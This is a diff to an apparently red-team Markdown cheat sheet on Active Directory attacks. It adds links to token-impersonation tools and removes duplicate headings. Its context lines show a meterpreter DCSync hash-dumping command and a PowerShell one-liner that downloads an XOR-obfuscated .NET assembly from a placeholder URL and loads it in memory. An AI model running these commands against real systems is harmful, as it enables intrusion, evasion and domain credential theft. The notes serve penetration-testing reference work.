@@ -8,10 +8,6 @@
 > After installing RSAT, you can go to "Users and Computers AD =&gt; View =&gt; Advanced"
 
 ## ACLs
-
-## ACLs
-
-## ACLs
 Get ACL
 
 ```bash
@@ -33,13 +29,13 @@ meterpreter > dcsync_ntlm <DOMAIN>\<user>
 ## Impersonation Token 
 
 ### Tools
-- Rubeus.exe
-- Incognito.exe
-- CrackMapExec
+- [Rubeus.exe](https://github.com/GhostPack/Rubeus)
+- [Incognito.exe](https://github.com/FSecureLABS/incognito) (Meterpreter extension)
+- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
 - [TokenManipulation.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1)
-- [Tokenvator](https://github.com/0xbadjuju/Tokenvator)
+- [Tokenvator](https://github.com/0xbadjuju/Tokenvator) (.NET CSHARP C#)
 
-Reflectively Load it with Powershell, Cobalt, SilentTrinity etc...
+Reflectively load .NET Assembly within Powershell (or Cobalt, SilentTrinity etc.) if you cant do it through your C2 Infra :
 
 ```powershell
 $wc=New-Object System.Net.WebClient;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials
@@ -48,9 +44,6 @@ $k="xxxxxxx";$i=0;[byte[]]$b=([byte[]]($wc.DownloadData("https://xxxxx")))|%{$_-
 $parameters=@("arg1", "arg2")
 [namespace.Class]::Main($parameters)
 ```
-
-Reflectively Load .NET Assembly within Powershell if you cant do it through your C2 Infra
-
 
 ### Kerberos impersonate
 
